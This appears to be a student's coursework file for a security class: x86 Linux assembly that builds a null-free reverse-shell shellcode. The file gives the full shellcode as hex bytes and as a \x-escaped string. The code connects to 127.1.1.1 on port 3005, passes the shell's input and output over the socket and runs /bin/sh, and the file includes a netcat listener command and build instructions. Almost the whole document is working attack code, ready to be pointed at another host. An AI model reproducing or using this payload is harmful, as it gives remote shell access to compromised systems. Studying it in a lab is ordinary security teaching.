; NOM / Prénom : NEHME Ali
; REVERSE SHELL ASM
; M1 - Sécurité - GR3
; ESGI
;

; 68 7f 01 01 01 66 68 0b bd 66
; B8 67 01 B3 02 66 53 41 31 D2
; cd 80 89 C3 66 B8 6a 01 89 E1
; B2 10 cd 80 50 68 6e 2f 73 68
; 68 2f 2f 62 69 04 03 89 C1 B0
; 3f 49 cd 80 75 f9 89 C8 b2 0b
; 92 89 e3 cd 80|40 31 DB cd 80


; 68 7f 01 01 01 66 68 0b bd 66
; 68 67 01 58 B3 02 6a 02 5b 6a 
; 01 59 31 D2 cd 80 89 C3 66 B8 
; 6a 01 89 E1 B2 10 cd 80 50 68
; 6e 2f 73 68 68 2f 2f 62 69 04
; 03 89 C1 B0 3f 49 cd 80 75 f9
; 89 C8 b2 0b 92 89 e3 cd 80|40
;  31 DB cd 80

; 68 7f 01 01 01 66 68 0b bd 66 68 67 01 58 B3 02 6a 02 5b 6a 01 59 31 D2 cd 80 89 C3 66 B8 6a 01 89 E1 B2 10 cd 80 50 68 6e 2f 73 68 68 2f 2f 62 69 04 03 89 C1 B0 3f 49 cd 80 75 f9 89 C8 b2 0b 92 89 e3 cd 80
; \x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x66\x68\x67\x01\x58\xB3\x02\x6a\x02\x5b\x6a\x01\x59\x31\xD2\xcd\x80\x89\xC3\x66\xB8\x6a\x01\x89\xE1\xB2\x10\xcd\x80\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x04\x03\x89\xC1\xB0\x3f\x49\xcd\x80\x75\xf9\x89\xC8\xb2\x0b\x92\x89\xe3\xcd\x80

; nasm -f elf32 reverseShell.s && ld -m elf_i386 reverseShell.o && strace ./a.out

section .text
    global _start

# nc -l -p 3005 -s 127.1.1.1

_start:

    push 0x0101017f     ;; 68 7f 01 01 01
    push word 0xbd0b    ;; 66 68 0b bd


    ; mov ax, 0x0167      ;; 66 B8 67 01
    push word 0x0167      ;; 66 68 67 01
    pop eax                ;; 58
    ; mov bl, 0x2         ;; B3 02
    push 0x2            ;; 6a 02
    pop ebx             ;; 5b

    ; push bx             ;; 66 53

    push 0x1            ;; 6a 01
    pop ecx             ;; 59

    xor edx, edx        ;; 31 D2
    int 0x80            ;; cd 80
    mov ebx, eax        ;; 89 C3

    mov ax, 0x16a       ;; 66 B8 6a 01
    mov ecx, esp        ;; 89 E1
    mov dl, 0x10        ;; B2 10
    int 0x80            ;; cd 80

    ;; pour ne pas avoir de nullbyte avec "int 0x80" ET "add eax, 0x3"
    push eax            ;; 50
    push 0x68732f6e     ;; 68 6e 2f 73 68
    push 0x69622f2f     ;; 68 2f 2f 62 69

    add eax, 0x3        ;; 04 03
    mov ecx, eax        ;; 89 C1

    not_finish_dup:     ;; jump ==> 0xff - 0x06 => 0xf9 (0x06 == nombre de caractères pour atteindre le label "not_finish_dup")
    mov al, 0x3f        ;; B0 3f
    dec ecx             ;; 49
    int 0x80            ;; cd 80
    jnz not_finish_dup  ;; 75 f9

    mov eax, ecx        ;; 89 C8
    mov dl, 0x0b        ;; b2 0b
    xchg eax, edx       ;; 92       ;; Etant donné que mov eax, 0x0b (b0 03), la solution qu'on a trouvé est d'inverser le stockage des données pour eax & edx (vu que mov edx, 0x0b ==> b2 0b) puis de les remettre à leur place avec xchg 

    ; lea ebx, [esp]      ;; 8D 1C 24
    mov ebx, esp        ;; 89 e3
    int 0x80            ;; cd 80

    ;; voir si après le execv, le exit sert à quelque chose
    ; inc eax           ;; 40
    ; xor ebx, ebx      ;; 31 DB
    ; int 0x80          ;; cd 80